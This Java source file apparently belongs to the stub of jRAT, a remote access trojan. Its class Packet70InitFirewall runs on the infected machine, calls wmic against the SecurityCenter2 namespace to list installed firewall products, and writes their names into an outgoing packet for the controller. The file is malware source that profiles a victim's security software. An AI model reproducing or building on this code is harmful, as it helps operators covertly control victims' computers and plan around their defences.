package io.jrat.stub.packets.outgoing;

import io.jrat.common.OperatingSystem;
import io.jrat.common.io.StringWriter;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;


public class Packet70InitFirewall extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		List<String> firewalls = new ArrayList<String>();

		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && !System.getProperty("os.name").toLowerCase().contains("xp")) {
			try {
				Process p = Runtime.getRuntime().exec(new String[] { "wmic", "/node:localhost", "/namespace:\\\\root\\SecurityCenter2", "path", "FirewallProduct", "get", "/format:list" });

				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					if (line.trim().startsWith("displayName")) {
						firewalls.add(line.trim().split("=")[1]);
					}
				}

				reader.close();

			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}

		dos.writeInt(firewalls.size());

		for (int i = 0; i < firewalls.size(); i++) {
			sw.writeLine(firewalls.get(i));
		}
	}

	@Override
	public byte getPacketId() {
		return 70;
	}

}
